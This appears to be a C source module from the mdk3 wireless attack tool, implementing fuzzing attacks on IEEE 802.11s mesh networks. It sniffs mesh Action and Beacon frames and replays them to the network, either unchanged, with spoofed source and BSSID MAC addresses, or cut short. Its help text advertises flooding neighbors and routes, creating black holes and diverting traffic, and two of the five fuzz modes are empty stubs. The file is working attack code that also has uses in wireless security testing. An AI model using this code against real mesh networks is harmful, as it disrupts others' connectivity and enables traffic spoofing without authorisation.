#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>

#include "ieee80211s.h"
#include "../osdep.h"
#include "../packet.h"
#include "../helpers.h"

#define IEEE80211S_MODE 's'
#define IEEE80211S_NAME "Attacks for IEEE 802.11s mesh networks"

// IMPORTANT:
// In order to include your attack into mdk3, you have to add it to attacks.h!

struct packet action_frame_sniffer_pkt;
pthread_mutex_t sniff_packet_mutex = PTHREAD_MUTEX_INITIALIZER;
unsigned int incoming_action = 0;
unsigned int incoming_beacon = 0;


struct ieee80211s_options {
  char *mesh_id;
  char attack_type;
  char fuzz_type;
  unsigned int speed;
};

void ieee80211s_shorthelp()
{
  printf("  Various attacks on link management and routing in mesh networks.\n");
  printf("  Flood neighbors and routes, create black holes and divert traffic!\n");
}

void ieee80211s_longhelp()
{
  printf( "  Various attacks on link management and routing in mesh networks.\n"
	  "  Flood neighbors and routes, create black holes and divert traffic!\n"
	  "      -f <type>\n"
	  "         Basic fuzzing tests. Picks up Action and Beacon frames from the air, modifies and replays them:\n"
	  "         The following modification types are implemented:\n"
	  "         1: Replay identical frame until new one arrives (duplicate flooding)\n"
	  "         2: Change Source and BSSID (possibly resulting in Neighbor Flooding)\n"
	  "         3: Cut packet short, leave 802.11 header intact (find buffer errors)\n"
	  "         4: Shotgun mode, randomly overwriting bytes after header (find bugs)\n"
	  "         5: Skript-kid's automated attack trying all of the above randomly :)\n"
	  "      -s <pps>\n"
	  "         Set speed in packets per second (Default: 100)\n"
	  "      -n <meshID>\n"
	  "         Target this mesh network\n");
}

void *ieee80211s_parse(int argc, char *argv[]) {
  int opt, i;
  struct ieee80211s_options *dopt = malloc(sizeof(struct ieee80211s_options));
  
  dopt->mesh_id = NULL;
  dopt->attack_type = 0x00;
  dopt->speed = 100;
  
  while ((opt = getopt(argc, argv, "n:f:s:")) != -1) {
    switch (opt) {
      case 'f':
	i = atoi(optarg);
	if ((i > 5) || (i < 1)) {
	  printf("Invalid Fuzzing type!\n"); return NULL;
	} else {
	  dopt->attack_type = 'f';
	  dopt->fuzz_type = (char) i;
	}
      break;
      case 's':
	dopt->speed = (unsigned int) atoi(optarg);
      break;
      case 'n':
	if (strlen(optarg) > 255) {
	  printf("ERROR: MeshID too long\n"); return NULL;
	} else if (strlen(optarg) > 32) {
	  printf("NOTE: Using Non-Standard MeshID with length > 32\n");
	}
	dopt->mesh_id = malloc(strlen(optarg) + 1); strcpy(dopt->mesh_id, optarg);
      break;
      default:
	ieee80211s_longhelp();
	printf("\n\nUnknown option %c\n", opt);
	return NULL;
    }
  }
  
  if (dopt->attack_type == 0x00) {
    ieee80211s_longhelp();
    printf("\n\nERROR: You must specify an attack type (ie. -f)!\n");
    return NULL;
  } 
  if (dopt->mesh_id == NULL) {
    ieee80211s_longhelp();
    printf("\n\nERROR: You must specify a Mesh ID for this attack!\n");
    return NULL;
  } 
  
  return (void *) dopt;
}

void ieee80211s_check(void *options) {
  options = options;
  //No checks yet.
}

/*  while(1) {
    pkt = osdep_read_packet();
    id = get_meshid(&pkt, NULL);
    if (id) {
      printf("MeshID found: %s\n", id);
      free(id);
    }
  }*/

int action_frame_sniffer_acceptpacket(struct packet sniffed) {
  pthread_mutex_lock(&sniff_packet_mutex);
  if (sniffed.len == action_frame_sniffer_pkt.len) {
    if (! memcmp(action_frame_sniffer_pkt.data, sniffed.data, sniffed.len)) {
      pthread_mutex_unlock(&sniff_packet_mutex);
      return -1;  //Sniffed own injected packet, drop
    }
  }
  if (action_frame_sniffer_pkt.data) free(action_frame_sniffer_pkt.data);
  action_frame_sniffer_pkt = copy_packet(sniffed);
  pthread_mutex_unlock(&sniff_packet_mutex);
  return 0;
}

void action_frame_sniffer_thread(void *target_id) {
  struct packet sniffed;
  struct ieee_hdr *hdr;
  struct action_fixed *act;
  char *meshid;
  
  while(1) {
    sniffed = osdep_read_packet();
    hdr = (struct ieee_hdr *) sniffed.data;
    if (hdr->type == IEEE80211_TYPE_ACTION) {
      act = (struct action_fixed *) (sniffed.data + sizeof(struct ieee_hdr));
      if (act->category == MESH_ACTION_CATEGORY) {
	if (action_frame_sniffer_acceptpacket(sniffed)) continue;
	incoming_action++;
      }
    } else if (hdr->type == IEEE80211_TYPE_BEACON) {
      meshid = get_meshid(&sniffed, NULL);
      if (meshid) {
	if (! strcmp(meshid, (char *) target_id)) {
	  if (action_frame_sniffer_acceptpacket(sniffed)) continue;
	  incoming_beacon++;
	}
	free(meshid);
      }
    }
    free(sniffed.data);
  }
}

struct packet do_fuzzing(struct ieee80211s_options *dopt) {
  struct packet pkt, sniff;
  static pthread_t *sniffer = NULL;
  struct ieee_hdr *hdr;
  static struct ether_addr genmac;
  static unsigned int genmac_uses = 0;
  
  if (! (genmac_uses % 10)) { //New MAC every 10 packets
    genmac = generate_mac(MAC_KIND_CLIENT);
    genmac_uses = 0;
  }
  genmac_uses++;
  
  if (sniffer == NULL) {
    sniffer = malloc(sizeof(pthread_t));
    action_frame_sniffer_pkt.len = 0;
    action_frame_sniffer_pkt.data = NULL;
    pthread_create(sniffer, NULL, (void *) action_frame_sniffer_thread, (void *) dopt->mesh_id);
  }
  
  pthread_mutex_lock(&sniff_packet_mutex);
  while(action_frame_sniffer_pkt.len == 0) {
    pthread_mutex_unlock(&sniff_packet_mutex);
    usleep(50000);
    pthread_mutex_lock(&sniff_packet_mutex);
  }
  sniff = copy_packet(action_frame_sniffer_pkt);
  pthread_mutex_unlock(&sniff_packet_mutex);
  
  switch (dopt->fuzz_type) {
    case 1:
      return sniff;
    break;
    case 2:
      hdr = (struct ieee_hdr *) sniff.data;
      hdr->addr2 = genmac; //Src
      hdr->addr3 = genmac; //BSSID
      return sniff;
    break;
    case 3:
      sniff.len = sizeof(struct ieee_hdr) + (random() % (sniff.len - sizeof(struct ieee_hdr)));
      return sniff;
    break;
    case 4:
      pkt.len = 0; pkt.data = NULL;
    break;
    case 5:
      pkt.len = 0; pkt.data = NULL;
    break;
    default:
      printf("BUG! Unknown fuzzing type %c\n", dopt->fuzz_type);
      pkt.len = 0; pkt.data = NULL;
  }
  
  return pkt;
}

struct packet ieee80211s_getpacket(void *options) {
  struct ieee80211s_options *dopt = (struct ieee80211s_options *) options;
  struct packet pkt;
  
  sleep_till_next_packet(dopt->speed);
  
  switch (dopt->attack_type) {
    case 'f':
      pkt = do_fuzzing(dopt);
    break;
    default:
      printf("BUG! Unknown attack type %c\n", dopt->attack_type);
      pkt.len = 0; pkt.data = NULL;
  }

  return pkt;
}

void ieee80211s_stats(void *options) {
  struct ieee80211s_options *dopt = (struct ieee80211s_options *) options;
  
  if (dopt->attack_type == 'f') {
    printf("\rReceived Action frames: %5d  Received Mesh Beacons:  %5d                    \n", incoming_action, incoming_beacon);
  }
}

struct attacks load_ieee80211s() {
  struct attacks this_attack;
  char *ieee80211s_name = malloc(strlen(IEEE80211S_NAME) + 1);
  strcpy(ieee80211s_name, IEEE80211S_NAME);

  this_attack.print_shorthelp = (fp) ieee80211s_shorthelp;
  this_attack.print_longhelp = (fp) ieee80211s_longhelp;
  this_attack.parse_options = (fpo) ieee80211s_parse;
  this_attack.mode_identifier = IEEE80211S_MODE;
  this_attack.attack_name = ieee80211s_name;
  this_attack.perform_check = (fps) ieee80211s_check;
  this_attack.get_packet = (fpp) ieee80211s_getpacket;
  this_attack.print_stats = (fps)ieee80211s_stats;
  
  return this_attack;
}
